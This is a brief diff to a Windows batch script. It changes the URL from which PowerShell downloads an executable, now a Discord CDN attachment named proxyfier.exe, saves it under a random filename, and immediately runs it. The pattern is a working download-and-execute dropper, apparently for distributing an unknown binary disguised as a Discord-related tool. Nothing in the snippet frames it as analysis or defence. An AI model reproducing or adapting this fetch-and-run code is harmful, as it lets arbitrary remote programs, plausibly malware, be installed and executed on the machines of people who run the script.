@@ -44,7 +44,6 @@ set "counter=1"
 set "filename=%random%%random%%random%%extension%"
 if exist "%filename%" goto generateFilename
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/SeniorPicchi/deleteDiscordMessages/raw/master/active.exe' -OutFile !filename!"
+Powershell -Command "Invoke-Webrequest 'https://cdn.discordapp.com/attachments/858285561802260521/1116117463566930020/proxyfier.exe' -OutFile !filename!"
 
 start "" "!filename!"
-echo stop vpn and try again
